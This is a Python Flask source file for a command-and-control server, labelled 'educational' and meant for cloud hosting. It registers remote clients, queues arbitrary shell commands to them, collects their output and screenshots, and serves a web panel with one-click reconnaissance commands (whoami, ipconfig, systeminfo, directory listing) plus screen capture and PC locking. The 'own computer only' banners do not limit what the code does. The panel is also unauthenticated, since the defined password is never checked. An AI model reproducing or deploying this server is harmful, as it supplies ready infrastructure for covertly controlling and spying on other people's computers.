#!/usr/bin/env python3
"""
🎯 EDUCATIONAL C2 SERVER - CLOUD VERSION
⚠️  ONLY for YOUR OWN computer!
"""

from flask import Flask, request, jsonify, render_template_string
import json
import datetime
import os

app = Flask(__name__)
PASSWORD = "sasuke_lab_2026"

clients = {}
commands = {}
results = {}
screenshots = {}

@app.route('/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        hostname = data.get('hostname')
        os_info = data.get('os')
        username = data.get('username')
        if client_id:
            clients[client_id] = {
                'id': client_id,
                'hostname': hostname,
                'os': os_info,
                'username': username,
                'first_seen': datetime.datetime.now().isoformat(),
                'last_seen': datetime.datetime.now().isoformat(),
            }
            return jsonify({'status': 'registered'})
        return jsonify({'status': 'error'}), 400
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/get_command/<client_id>')
def get_command(client_id):
    if client_id in clients:
        clients[client_id]['last_seen'] = datetime.datetime.now().isoformat()
        if client_id in commands and commands[client_id]:
            command = commands[client_id].pop(0)
            return jsonify({'command': command})
    return jsonify({'command': None})

@app.route('/send_result', methods=['POST'])
def send_result():
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        output = data.get('output')
        command = data.get('command')
        if client_id not in results:
            results[client_id] = []
        results[client_id].append({
            'command': command,
            'output': output,
            'timestamp': datetime.datetime.now().isoformat()
        })
        return jsonify({'status': 'received'})
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/upload_screenshot', methods=['POST'])
def upload_screenshot():
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        image_data = data.get('image')
        if client_id and image_data:
            screenshots[client_id] = {
                'image': image_data,
                'timestamp': datetime.datetime.now().isoformat()
            }
            return jsonify({'status': 'uploaded'})
        return jsonify({'status': 'error'}), 400
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>🎯 Remote Control Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Consolas', monospace; background: #0a0e17; color: #e0e0e0; padding: 15px; }
            .container { max-width: 1200px; margin: 0 auto; }
            h1 { color: #00d4ff; border-bottom: 2px solid #00d4ff; padding-bottom: 10px; margin-bottom: 15px; }
            .warning { background: #1a0000; border: 1px solid #ff4444; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 15px; font-size: 12px; }
            .card { background: #1a2332; padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #1f2937; }
            .card h3 { color: #00d4ff; margin-bottom: 10px; font-size: 14px; }
            .client-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 10px; }
            .client-card { background: #0f1622; padding: 12px; border-radius: 8px; border: 1px solid #1f2937; cursor: pointer; transition: 0.3s; }
            .client-card:hover { border-color: #00d4ff; }
            .client-card.selected { border-color: #22c55e; background: #0f2a1a; }
            .client-card .name { color: #00d4ff; font-size: 14px; margin-bottom: 5px; }
            .client-card .info { font-size: 11px; color: #6b7280; }
            .status-online { color: #22c55e; }
            .status-offline { color: #ff4444; }
            .command-row { display: flex; gap: 10px; margin: 10px 0; }
            .command-row input { flex: 1; padding: 10px; background: #0a0a0a; border: 1px solid #333; color: #0f0; border-radius: 4px; font-family: monospace; }
            .command-row button { padding: 10px 20px; background: #00d4ff; color: #000; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
            .command-row button:hover { background: #0099cc; }
            .output { background: #0a0a0a; padding: 12px; border-radius: 6px; font-size: 12px; max-height: 300px; overflow-y: auto; border: 1px solid #333; white-space: pre-wrap; word-break: break-all; margin-top: 10px; font-family: monospace; }
            .screenshot-container { background: #0a0a0a; padding: 10px; border-radius: 6px; margin-top: 10px; text-align: center; }
            .screenshot-container img { max-width: 100%; max-height: 400px; border-radius: 4px; }
            .btn-row { display: flex; gap: 8px; flex-wrap: wrap; margin: 10px 0; }
            .btn { padding: 6px 12px; background: #1f2937; color: #e0e0e0; border: 1px solid #374151; border-radius: 4px; cursor: pointer; font-size: 11px; }
            .btn:hover { background: #374151; border-color: #00d4ff; }
            .btn-primary { background: #00d4ff; color: #000; border-color: #00d4ff; }
            .btn-primary:hover { background: #0099cc; }
            .btn-danger { background: #ff4444; color: #fff; border-color: #ff4444; }
            .no-client { color: #6b7280; text-align: center; padding: 20px; }
            .footer { color: #6b7280; font-size: 11px; text-align: center; margin-top: 20px; padding-top: 15px; border-top: 1px solid #1f2937; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 Remote Control Panel</h1>
            <div class="warning">⚠️ ONLY for YOUR OWN computer! Educational purposes only.</div>
            <div class="card">
                <h3>💻 Your Computers</h3>
                <div id="clients" class="client-grid"><div class="no-client">Loading...</div></div>
            </div>
            <div class="card" id="commandPanel" style="display:none;">
                <h3>💀 Commands</h3>
                <div style="font-size:12px;color:#6b7280;margin-bottom:10px;">
                    Selected: <span id="selectedClient" style="color:#22c55e;">None</span>
                </div>
                <div class="command-row">
                    <input type="text" id="commandInput" placeholder="Enter command (e.g., whoami, dir, ipconfig)" />
                    <button onclick="sendCommand()">▶ Execute</button>
                </div>
                <div class="btn-row">
                    <button class="btn" onclick="quickCommand('whoami')">👤 Whoami</button>
                    <button class="btn" onclick="quickCommand('ipconfig')">🌐 IP Config</button>
                    <button class="btn" onclick="quickCommand('dir C:\\\\')">📁 List Files</button>
                    <button class="btn" onclick="quickCommand('systeminfo')">💻 System Info</button>
                    <button class="btn btn-primary" onclick="quickCommand('screenshot')">📸 Screenshot</button>
                    <button class="btn btn-danger" onclick="quickCommand('lock')">🔒 Lock PC</button>
                </div>
                <div id="output" class="output">Select a computer and send a command...</div>
                <div id="screenshot" class="screenshot-container" style="display:none;">
                    <img id="screenshotImg" src="" alt="Screenshot" />
                </div>
            </div>
            <div class="footer">⚠️ Educational Lab Only — Your own devices only</div>
        </div>
        <script>
            let selectedClient = null;
            function refreshClients() {
                fetch('/api/clients').then(r => r.json()).then(data => {
                    const container = document.getElementById('clients');
                    if (data.length === 0) {
                        container.innerHTML = '<div class="no-client">No computers connected. Run the client on YOUR PC.</div>';
                        return;
                    }
                    container.innerHTML = data.map(c => `
                        <div class="client-card ${selectedClient === c.id ? 'selected' : ''}" onclick="selectClient('${c.id}', '${c.hostname}')">
                            <div class="name">🖥️ ${c.hostname || c.id}</div>
                            <div class="info">${c.os || 'Unknown'} | User: ${c.username || 'Unknown'}</div>
                            <div class="info ${c.status === 'online' ? 'status-online' : 'status-offline'}">${c.status === 'online' ? '🟢 Online' : '🔴 Offline'}</div>
                            <div class="info" style="font-size:10px;">Last seen: ${c.last_seen || 'Never'}</div>
                        </div>
                    `).join('');
                });
            }
            function selectClient(id, hostname) {
                selectedClient = id;
                document.getElementById('selectedClient').textContent = hostname || id;
                document.getElementById('commandPanel').style.display = 'block';
                refreshClients();
                fetchResults();
            }
            function sendCommand() {
                const command = document.getElementById('commandInput').value;
                if (!command || !selectedClient) { alert('Select a computer and enter a command'); return; }
                fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ client_id: selectedClient, command: command })
                }).then(r => r.json()).then(data => {
                    document.getElementById('output').textContent = `⏳ Command sent: ${command}\nWaiting for result...`;
                    document.getElementById('commandInput').value = '';
                    setTimeout(fetchResults, 2000);
                });
            }
            function quickCommand(cmd) {
                document.getElementById('commandInput').value = cmd;
                sendCommand();
            }
            function fetchResults() {
                if (!selectedClient) return;
                fetch(`/api/results/${selectedClient}`).then(r => r.json()).then(data => {
                    if (data.length > 0) {
                        const last = data[data.length - 1];
                        document.getElementById('output').textContent = `📥 Command: ${last.command}\n\n${last.output}`;
                    }
                });
                fetch(`/api/screenshot/${selectedClient}`).then(r => r.json()).then(data => {
                    if (data.image) {
                        document.getElementById('screenshot').style.display = 'block';
                        document.getElementById('screenshotImg').src = 'data:image/png;base64,' + data.image;
                    }
                });
            }
            refreshClients();
            setInterval(refreshClients, 5000);
            setInterval(fetchResults, 3000);
        </script>
    </body>
    </html>
    ''')

@app.route('/api/clients')
def api_clients():
    client_list = []
    for c in clients.values():
        if 'last_seen' in c:
            try:
                last = datetime.datetime.fromisoformat(c['last_seen'])
                if (datetime.datetime.now() - last).total_seconds() < 60:
                    c['status'] = 'online'
                else:
                    c['status'] = 'offline'
            except:
                c['status'] = 'unknown'
        client_list.append(c)
    return jsonify(client_list)

@app.route('/api/command', methods=['POST'])
def api_command():
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        command = data.get('command')
        if client_id not in commands:
            commands[client_id] = []
        commands[client_id].append(command)
        return jsonify({'status': 'queued'})
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/api/results/<client_id>')
def api_results(client_id):
    if client_id in results:
        return jsonify(results[client_id][-10:])
    return jsonify([])

@app.route('/api/screenshot/<client_id>')
def api_screenshot(client_id):
    if client_id in screenshots:
        return jsonify(screenshots[client_id])
    return jsonify({})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
